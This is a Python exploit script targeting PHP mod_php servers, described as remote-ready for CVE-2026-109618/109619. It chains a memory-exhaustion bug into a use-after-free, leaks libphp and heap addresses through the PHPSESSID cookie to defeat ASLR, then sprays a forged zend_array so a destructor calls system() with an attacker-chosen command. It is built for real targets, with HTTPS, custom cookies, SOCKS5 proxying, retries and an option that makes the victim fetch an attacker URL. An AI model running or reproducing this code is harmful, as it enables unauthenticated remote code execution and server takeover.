#!/usr/bin/env python3
"""php2shell_pwn.py - remote-ready exploit for CVE-2026-109618/109619
(PHP session upload progress OOM -> cross-request UAF -> zval_ptr_dtor on a
forged zend_array -> zend_call_function -> zif_system = RCE, unauthenticated,
pre-RINIT, mod_php prefork).

Chain over ONE keep-alive connection (pins a single mod_php worker):
  A1  END-cleanup send_cookie OOM (chunked) -> worker 500s, survives,
      dangling PS(id)/PS(mod_data)
  B1  stale-id OOB read -> Set-Cookie PHPSESSID carries ~800KB of heap:
      most-common mmap pointer = &zval_ptr_dtor -> libphp base; bucket
      cluster with count ~ MAIN_BUCKET_COUNT -> main chunk base
  A2  cheap-OOM nested empty-file fields -> dangling PS(http_session_vars)
  B2  fake reference spray + fake zend_array (pDestructor=zif_system)
      -> destructor executes system(cmd)

Offsets are build-specific libphp.so symbol addresses (nm output). Known
table covers the lab build; for other victims supply --zdtor-off/--zif-off.

Examples:
  python3 php2shell_pwn.py --url https://t/index.php --detect-only
  python3 php2shell_pwn.py --url http://127.0.0.1:18110/index.php --cmd 'id>/out/p3'
  python3 php2shell_pwn.py --url https://t/index.php --cookie 'PHPSESSID=...; __cf_bm=...' --oob-url http://CANARY/hit
"""
from __future__ import annotations

import argparse
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse
from collections import Counter
from typing import Dict, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
PURE = os.environ.get("P2S_PURE", os.path.join(HERE, "pure"))
if not os.path.isdir(PURE):
    raise SystemExit(
        "helpers de 9bie/pure no encontrados en %r\n"
        "  -> git clone https://github.com/9bie/php2shell-bypass-aslr-exp\n"
        "  -> P2S_PURE=<repo>/pure python3 php2shell_pwn.py ..." % PURE
    )
if PURE not in sys.path:
    sys.path.insert(0, PURE)

from mk_ht import build as mk_ht_build                # noqa: E402
from cheap_oom_a import build_body as cheap_oom_body  # noqa: E402
from fake_ref_b import make_spray, make_name          # noqa: E402

Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
MAIN_BUCKET_COUNT = 87
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")


def normalize_url(raw: str) -> Tuple[str, str, int, str]:
    raw = raw.strip()
    if "://" not in raw:
        raw = "https://" + raw
    p = urllib.parse.urlsplit(raw)
    if p.scheme not in ("http", "https") or not p.netloc:
        raise ValueError("invalid URL: %r" % raw)
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/index.php"
    return p.scheme, p.hostname, port, path


class Conn:
    """Persistent HTTP/1.1 connection; chunked uploads; auto reconnect."""

    def __init__(self, scheme, host, port, timeout, insecure,
                 cookies="", headers=None, proxy=None):
        self.scheme, self.host, self.port, self.timeout = scheme, host, port, timeout
        self.proxy = proxy
        self.insecure = insecure
        self.base_headers = {"User-Agent": DEFAULT_UA, "Accept-Encoding": "identity"}
        if cookies:
            self.base_headers["Cookie"] = cookies
        if headers:
            self.base_headers.update(headers)
        self.sock = None
        self.rfile = None
        self.connect()

    def _socks5_connect(self):
        phost, pport = self.proxy.rsplit(":", 1)
        s = socket.create_connection((phost, int(pport)), timeout=self.timeout)
        s.settimeout(self.timeout)
        s.sendall(b"\x05\x01\x00")
        if s.recv(2) != b"\x05\x00":
            raise OSError("socks5 no-auth not offered")
        addr = self.host.encode()
        s.sendall(b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr
                  + struct.pack(">H", self.port))
        resp = s.recv(264)
        if len(resp) < 2 or resp[1] != 0:
            raise OSError("socks5 connect failed rep=%d" % (resp[1] if len(resp) > 1 else -1))
        return s

    def connect(self):
        if self.proxy:
            s = self._socks5_connect()
        else:
            s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            if self.insecure:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        self.sock = s
        self.rfile = s.makefile("rb")

    def close(self):
        try:
            if self.rfile:
                self.rfile.close()
            if self.sock:
                self.sock.close()
        except OSError:
            pass
        self.sock = self.rfile = None

    def ensure(self):
        if self.sock is None:
            self.connect()

    def request(self, path, body, chunked=False):
        hdrs = dict(self.base_headers)
        hdrs["Content-Type"] = "multipart/form-data; boundary=CCCCCCCCCC"
        host = self.host if self.port in (80, 443) else "%s:%d" % (self.host, self.port)
        hdrs["Host"] = host
        hdrs["Connection"] = "keep-alive"
        head = "POST " + path + " HTTP/1.1\r\n"
        for k, v in hdrs.items():
            head += k + ": " + v + "\r\n"
        if chunked:
            head += "Transfer-Encoding: chunked\r\n\r\n"
        else:
            head += "Content-Length: %d\r\n\r\n" % len(body)
        self.ensure()
        self.sock.sendall(head.encode("latin1"))
        if chunked:
            for off in range(0, len(body), 65536):
                piece = body[off:off + 65536]
                self.sock.sendall(b"%x\r\n" % len(piece) + piece + b"\r\n")
            self.sock.sendall(b"0\r\n\r\n")
        else:
            self.sock.sendall(body)

        status_line = self.rfile.readline(8 << 20)
        while status_line in (b"\r\n", b"\n"):
            status_line = self.rfile.readline(8 << 20)
        if not status_line:
            raise ConnectionResetError("empty status line")
        parts = status_line.split(None, 2)
        if len(parts) < 2 or not parts[1].isdigit():
            raise ValueError("bad status line: %r" % status_line[:60])
        status = int(parts[1])
        headers = {}
        while True:
            line = self.rfile.readline(8 << 20)
            if line in (b"\r\n", b"\n", b""):
                break
            k, _, v = line.decode("latin1").partition(":")
            headers[k.strip().lower()] = v.strip()
        body_out = bytearray()
        if headers.get("transfer-encoding", "").lower() == "chunked":
            while True:
                size_line = self.rfile.readline(8 << 20).strip()
                if not size_line:
                    break
                size = int(size_line.split(b";")[0], 16)
                if size == 0:
                    self.rfile.readline(8 << 20)
                    break
                body_out += self.rfile.read(size)
                self.rfile.read(2)
        elif "content-length" in headers:
            body_out += self.rfile.read(int(headers["content-length"]))
        else:
            try:
                while True:
                    piece = self.rfile.read(65536)
                    if not piece:
                        break
                    body_out += piece
            except (OSError, ssl.SSLError):
                pass
            self.close()
        if headers.get("connection", "").lower() == "close":
            self.close()
        return status, headers, bytes(body_out)


def parse_leak(sid_value: Optional[str], resp: bytes, zdtor_off: Optional[int]) -> dict:
    if not sid_value:
        raise RuntimeError("no Set-Cookie header")
    m = sid_value.find("PHPSESSID=")
    raw_val = sid_value[m + 10:] if m >= 0 else sid_value
    for cut in (";", ","):
        j = raw_val.find(cut)
        if j >= 0:
            raw_val = raw_val[:j]
    dec = urllib.parse.unquote_to_bytes(raw_val).replace(b"+", b" ")
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7f0000000000 <= q <= 0x7fffffffffff or \
           0x0000ffff00000000 <= q <= 0x0000ffffffffffff:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no mmap pointers in %dB window" % len(dec))
    zdtor = arm = None
    if zdtor_off is not None:
        for q, c in counts.most_common(8):
            if c >= 100 and ((q - zdtor_off) & 0xFFF) == 0:
                zdtor = q
                break
        if zdtor is None:
            raise RuntimeError("no pointer matches zdtor_off %#x" % zdtor_off)
    else:
        for q, c in counts.most_common(8):
            if c < 100:
                break
            for arm_try, off in ((True, 0x638120), (False, 0x65EB60)):
                if c >= 100 and ((q - off) & 0xFFF) == 0:
                    zdtor, arm, zdtor_off = q, arm_try, off
                    break
            if zdtor:
                break
        if zdtor is None:
            raise RuntimeError("anchor not identified; pass --zdtor-off")
    lib = zdtor - zdtor_off
    if arm is None:
        arm = (zdtor >> 32) == 0xFFFF
    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common() if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return {"decoded": len(dec), "zdtor": zdtor, "lib": lib, "arm": arm,
            "buckets": buckets, "cands": cands[:3], "zdtor_off": zdtor_off}



DETECT_SID = "u0123456789abcdefghijklmnopqrstuv"

def arm_classic(namelen):
    """Classic pre-RINIT OOM arm: multipart with huge filename; fires when
    memory_limit is small relative to the parser copies. Content-Length POST."""
    BND = b"CCCCCCCCCC"

    def part(name, value, filename=None):
        d = b'Content-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            d += b'; filename="' + filename + b'"'
        return b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"

    o = part(b"PHPSESSID", DETECT_SID.encode()) + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    o += part(b"f", b"A" * 6144, filename=b"N" * namelen)
    return o + b"--" + BND + b"--\r\n"


def a1_only(url, conn, timeout):
    """Detection ladder without exploit chain:
    1) classic filename arm (1.3MB / 1.8MB) -> 500/crash for small memory_limit
    2) A1 chunked send_cookie OOM (mk_a1.py --big 78) -> 500 for ~128M victims
    Reports status pattern per stage (mod_php vs FPM vs no-PHP-parse)."""
    _scheme, _host, _port, path = url
    out = []
    hd = {}
    for nl in (1_300_000, 1_800_000):
        body = arm_classic(nl)
        st = 0
        bd = b""
        try:
            st, hd, bd = conn.request(path, body, chunked=False)
            sig = "HTTP %d, %dB body" % (st, len(bd))
        except Exception as exc:
            conn.close()
            sig = "connection lost (%s)" % type(exc).__name__
            try:
                conn.connect()
            except Exception:
                pass
        sc = "yes" if isinstance(hd, dict) and "set-cookie" in hd else "no"
        out.append("classic arm %dB -> %s, Set-Cookie=%s" % (len(body), sig, sc))
        if st in (502, 503, 504):
            out.append("   => 502/503/504 = FPM-class signature")
    a1 = os.path.join(tempfile.mkdtemp(prefix="p2s_a1_"), "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                    "--out", a1, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL)
    body = open(a1, "rb").read()
    hd = {}
    bd = b""
    try:
        st, hd, bd = conn.request(path + Q, body, chunked=True)
        sig = "HTTP %d, %dB body" % (st, len(bd))
    except Exception as exc:
        conn.close()
        sig = "connection lost (%s)" % type(exc).__name__
        st = 0
    sc = "yes" if isinstance(hd, dict) and "set-cookie" in hd else "no"
    out.append("A1 chunked %dB -> %s, Set-Cookie=%s" % (len(body), sig, sc))
    if b"Allowed memory size of" in bd:
        out.append("   => in-band PHP fatal error captured")
    if st in (502, 503, 504):
        out.append("   => FPM-class signature")
    elif st == 500 or st == 0:
        out.append("   => crash/500 pattern (mod_php-class if control was 200)")
    return "\n".join(out)


def chain_once(url, conn, tmp, cmd, zdtor_off, zif_off):
    _scheme, _host, _port, path = url

    a1 = os.path.join(tmp, "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                    "--out", a1, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL)
    body = open(a1, "rb").read()
    try:
        status, _h, _b = conn.request(path + Q, body, chunked=True)
    except (ConnectionResetError, BrokenPipeError, OSError, ssl.SSLError, ValueError):
        conn.close()
        status = 500
    if status not in (0, 500):
        return None, "A1 unexpected status %d" % status

    b1 = os.path.join(tmp, "b1.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
                    "--out", b1, "--spec", LEAK_SPEC, "--fake-len", "0xC8000",
                    "--tag"], check=True, stdout=subprocess.DEVNULL)
    body = open(b1, "rb").read()
    try:
        status, headers, resp = conn.request(path, body, chunked=True)
    except (ConnectionResetError, BrokenPipeError, OSError, ssl.SSLError, ValueError):
        conn.close()
        return None, "B1 connection lost"
    if "set-cookie" not in headers:
        return None, "B1 no Set-Cookie (status %d)" % status
    try:
        info = parse_leak(headers["set-cookie"], resp, zdtor_off)
    except RuntimeError as exc:
        return None, "B1 parse: %s" % exc
    if not info["cands"]:
        return None, "B1 no main candidates"

    for main, count in info["cands"]:
        delta = info["lib"] - main
        dmin, dmax = (0x800000, 0x80000000) if info["arm"] else (0x400000, 0x20000000)
        if not (dmin <= delta <= dmax):
            continue
        zif = info["lib"] + (zif_off if zif_off else (0x42CD70 if info["arm"] else 0x465370))
        S = main + 0xF8398

        a2 = cheap_oom_body(parts=880, depth=64, fillers=115,
                            sid=b"a" * 32, progress=b"k0", boundary=b"C" * 10)
        try:
            conn.request(path, a2, chunked=False)
        except (ConnectionResetError, BrokenPipeError, OSError, ssl.SSLError, ValueError):
            conn.close()
        time.sleep(0.2)

        ht = mk_ht_build(S, zif, cmd.encode(), 384)
        spray = make_spray(384, S, 1, 0x0107, 8, 32)
        bnd = b"C" * 10

        def part(name, value):
            return (b"--" + bnd + b"\r\nContent-Disposition: form-data; name=\"" +
                    name + b"\"\r\n\r\n" + value + b"\r\n")

        b2 = bytearray()
        for i in range(500):
            b2 += part(make_name(b"s", i, 10), spray)
        b2 += part(b"ht", ht)
        b2 += part(b"PHPSESSID", b"a" * 32)
        b2 += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
        for i in range(495):
            b2 += part(make_name(b"t", i, 10), spray)
        b2 += b"--" + bnd + b"--\r\n"
        try:
            conn.request(path, bytes(b2), chunked=False)
        except (ConnectionResetError, BrokenPipeError, OSError, ssl.SSLError, ValueError):
            conn.close()
        time.sleep(0.6)
        return "main=%#x S=%#x zif=%#x" % (main, S, zif), "FIRED"
    return None, "B1 main candidates rejected (delta)"


def main() -> int:
    ap = argparse.ArgumentParser(description="php2shell exploit (CVE-2026-109618/109619)")
    ap.add_argument("--url", help="target base URL (path defaults to /index.php)")
    ap.add_argument("--cookie", default="", help="Cookie header value")
    ap.add_argument("--header", action="append", dest="headers",
                    help="extra header 'Key: Value'; repeatable")
    ap.add_argument("--cmd", default="id>/tmp/.p", help="command for system()")
    ap.add_argument("--oob-url", default="",
                    help="URL the victim fetches as RCE proof (sets --cmd)")
    ap.add_argument("--detect-only", action="store_true")
    ap.add_argument("--a1-only", action="store_true",
                    help="detection ladder only: classic arms + A1 OOM probe")
    ap.add_argument("--retries", type=int, default=8)
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("-k", "--insecure", action="store_true")
    ap.add_argument("--proxy", default="",
                    help="socks5 proxy host:port (e.g. 127.0.0.1:40000 WARP)")
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()
    if not args.url:
        raise SystemExit("--url required")

    url = normalize_url(args.url)
    custom: Dict[str, str] = {}
    for h in args.headers or []:
        k, _, v = h.partition(":")
        custom[k.strip()] = v.strip()
    if args.oob_url and args.cmd == "id>/tmp/.p":
        args.cmd = 'php -r "file_get_contents(\\\"%s\\\");"' % args.oob_url

    scheme, host, port, path = url

    conn = Conn(scheme, host, port, min(args.timeout, 60), args.insecure,
                args.cookie, custom, proxy=args.proxy or None)
    control_body = (b"--C\r\nContent-Disposition: form-data; name=\"a\"; filename=\"\r\n\r\n\r\n--C--\r\n")
    try:
        st, hd, _b = conn.request(path, control_body, chunked=False)
        conn.close()
    except Exception as exc:
        print("[!] control request failed: %r" % (exc,))
        return 2
    print("[*] control: HTTP %d, %dB, X-Powered-By=%r" %
          (st, len(_b), hd.get("x-powered-by", "")))
    if args.detect_only:
        return 0

    if args.a1_only:
        detconn = Conn(scheme, host, port, args.timeout, args.insecure,
                       args.cookie, custom, proxy=args.proxy or None)
        try:
            print(a1_only(url, detconn, args.timeout))
        finally:
            detconn.close()
        return 0

    tmpdir = tempfile.mkdtemp(prefix="p2s_")
    for attempt in range(1, args.retries + 1):
        if not args.quiet:
            print("[*] attempt %d/%d" % (attempt, args.retries))
        conn = Conn(scheme, host, port, args.timeout, args.insecure,
                    args.cookie, custom, proxy=args.proxy or None)
        try:
            fired, stage = chain_once(url, conn, tmpdir, args.cmd,
                                      args.zdtor_off, args.zif_off)
        except Exception as exc:
            fired, stage = None, "chain error: %r" % (exc,)
        conn.close()
        if not args.quiet:
            print("    -> %s" % stage)
        if fired:
            print("[+] RCE fired: %s" % fired)
            print("[+] cmd: %s" % args.cmd)
            print("[i] verify via OOB canary / readable side effect")
            return 0
    print("[-] no RCE after %d attempts" % args.retries)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
